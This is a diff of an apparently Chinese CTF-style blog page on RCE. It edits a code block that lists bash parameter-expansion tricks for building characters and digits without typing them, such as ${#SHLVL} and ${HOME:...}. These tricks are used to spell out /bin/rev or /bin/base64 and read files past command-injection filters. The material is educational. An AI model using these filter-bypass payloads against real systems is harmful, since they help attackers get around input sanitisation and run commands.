@@ -246,7 +246,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/RCE/" style="color: #00a596">RCE</a>
+                <a href="/blog/tags/RCE/" style="color: #ff7d73">RCE</a>
             </span>
             
         </span>
@@ -1358,7 +1358,7 @@ $lib为要加载和链接的共享库文件名称，
 <p><strong>PHP_VERSION</strong>:以<strong>7.3.22</strong>为例</p>
 <p>**$?**：是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误</p>
 <blockquote>
-<p>此处防止渲染失败使用了%，实际使用时需删去%</p>
+<p>此处防止渲染失败使用了tab分隔，不过直接复制也不影响命令执行</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$&#123;<span class="token environment constant">PATH</span><span class="token operator">:</span>~0&#125;</span>或<span class="token variable">$&#123;<span class="token environment constant">PATH</span><span class="token operator">:</span>~A&#125;</span>
 获取字符n（0和字母都代表从最后面数）
@@ -1371,28 +1371,28 @@ var/www/html
 <span class="token variable">$&#123;<span class="token environment constant">PWD</span><span class="token operator">:</span>2<span class="token operator">:</span>4&#125;</span><span class="token punctuation">(</span>第三位是长度<span class="token punctuation">)</span>
 ar/w
 
-<span class="token variable">$&#123;<span class="token operator">%</span><span class="token operator">#</span><span class="token operator">%</span>&#125;</span>
+<span class="token variable">$&#123;	<span class="token operator">#</span>	&#125;</span>
 获取数字0
-<span class="token variable">$&#123;<span class="token operator">%</span><span class="token operator">#</span>SHLVL<span class="token operator">%</span>&#125;</span>或<span class="token variable">$&#123;<span class="token operator">%</span><span class="token operator">##</span><span class="token operator">%</span>&#125;</span>或<span class="token variable">$&#123;<span class="token operator">%</span><span class="token operator">#</span>?<span class="token operator">%</span>&#125;</span>
+<span class="token variable">$&#123;	<span class="token operator">#</span>SHLVL	&#125;</span>或<span class="token variable">$&#123;	<span class="token operator">##</span>	&#125;</span>或<span class="token variable">$&#123;	<span class="token operator">#</span>?	&#125;</span>
 获取数字1
-<span class="token variable">$&#123;<span class="token operator">%</span>PHP_VERSION<span class="token operator">:</span>~A<span class="token operator">%</span>&#125;</span>
+<span class="token variable">$&#123;	PHP_VERSION<span class="token operator">:</span>~A	&#125;</span>
 从7.3.22中获取数字2
-<span class="token variable">$&#123;<span class="token operator">%</span><span class="token operator">#</span>IFS<span class="token operator">%</span>&#125;</span><span class="token operator">=</span><span class="token number">3</span>
+<span class="token variable">$&#123;	<span class="token operator">#</span>IFS	&#125;</span><span class="token operator">=</span><span class="token number">3</span>
 linux下是3，mac里是4
-<span class="token variable">$&#123;<span class="token operator">%</span><span class="token operator">#</span>RANDOM<span class="token operator">%</span>&#125;</span>
+<span class="token variable">$&#123;	<span class="token operator">#</span>RANDOM	&#125;</span>
 获取4或5
-<span class="token variable">$&#123;<span class="token operator">%</span>HOME<span class="token operator">:</span>$&#123;<span class="token operator">%</span><span class="token operator">#</span><span class="token operator">%</span>&#125;</span><span class="token builtin class-name">:</span><span class="token variable">$&#123;<span class="token operator">%</span><span class="token operator">##</span><span class="token operator">%</span>&#125;</span>%<span class="token punctuation">&#125;</span>或<span class="token variable">$&#123;<span class="token operator">%</span>PWD<span class="token operator">:</span><span class="token operator">:</span>$&#123;<span class="token operator">%</span><span class="token operator">#</span>SHLVL<span class="token operator">%</span>&#125;</span>%<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;<span class="token environment constant">HOME</span><span class="token operator">:</span>$&#123;	<span class="token operator">#</span>	&#125;</span><span class="token builtin class-name">:</span><span class="token variable">$&#123;	<span class="token operator">##</span>	&#125;</span><span class="token punctuation">&#125;</span>或<span class="token variable">$&#123;<span class="token environment constant">PWD</span><span class="token operator">:</span><span class="token operator">:</span>$&#123;	<span class="token operator">#</span>SHLVL	&#125;</span><span class="token punctuation">&#125;</span>
 获取/
-<span class="token variable">$&#123;<span class="token operator">%</span>USER<span class="token operator">:</span>~A<span class="token operator">%</span>&#125;</span>
+<span class="token variable">$&#123;<span class="token environment constant">USER</span><span class="token operator">:</span>~A&#125;</span>
 获取a
-<span class="token variable">$&#123;<span class="token operator">%</span>HOME<span class="token operator">:</span>$&#123;<span class="token operator">%</span><span class="token operator">#</span>HOSTNAME<span class="token operator">%</span>&#125;</span><span class="token builtin class-name">:</span><span class="token variable">$&#123;<span class="token operator">%</span><span class="token operator">#</span>SHLVL<span class="token operator">%</span>&#125;</span>%<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;<span class="token environment constant">HOME</span><span class="token operator">:</span>$&#123;	<span class="token operator">#</span>HOSTNAME	&#125;</span><span class="token builtin class-name">:</span><span class="token variable">$&#123;	<span class="token operator">#</span>SHLVL	&#125;</span><span class="token punctuation">&#125;</span>
 获取t
-<span class="token variable">$&#123;<span class="token operator">%</span>PWD<span class="token operator">:</span>$&#123;<span class="token operator">%</span><span class="token operator">#</span>IFS<span class="token operator">%</span>&#125;</span><span class="token builtin class-name">:</span><span class="token variable">$&#123;<span class="token operator">%</span><span class="token operator">#</span>?<span class="token operator">%</span>&#125;</span>%<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;<span class="token environment constant">PWD</span><span class="token operator">:</span>$&#123;<span class="token operator">#</span>IFS	&#125;</span><span class="token builtin class-name">:</span><span class="token variable">$&#123;	<span class="token operator">#</span>?	&#125;</span><span class="token punctuation">&#125;</span>
 获取r
 构造/bin/rev逆序读取文件
 
 过滤<span class="token comment">#时</span>
-<span class="token operator">&lt;</span>A<span class="token punctuation">;</span><span class="token variable">$&#123;<span class="token operator">%</span>HOME<span class="token operator">:</span><span class="token operator">:</span>$?<span class="token operator">%</span>&#125;</span>???<span class="token variable">$&#123;<span class="token operator">%</span>HOME<span class="token operator">:</span><span class="token operator">:</span>$?<span class="token operator">%</span>&#125;</span>?????<span class="token variable">$&#123;<span class="token operator">%</span>RANDOM<span class="token operator">:</span><span class="token operator">:</span>$?<span class="token operator">%</span>&#125;</span> ????.???
+<span class="token operator">&lt;</span>A<span class="token punctuation">;</span><span class="token variable">$&#123;	HOME<span class="token operator">:</span><span class="token operator">:</span>$?	&#125;</span>???<span class="token variable">$&#123;	HOME<span class="token operator">:</span><span class="token operator">:</span>$?	&#125;</span>?????<span class="token variable">$&#123;	RANDOM<span class="token operator">:</span><span class="token operator">:</span>$?	&#125;</span> ????.???
 <span class="token punctuation">(</span>让前面报错得到1<span class="token punctuation">)</span> /bin/base64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
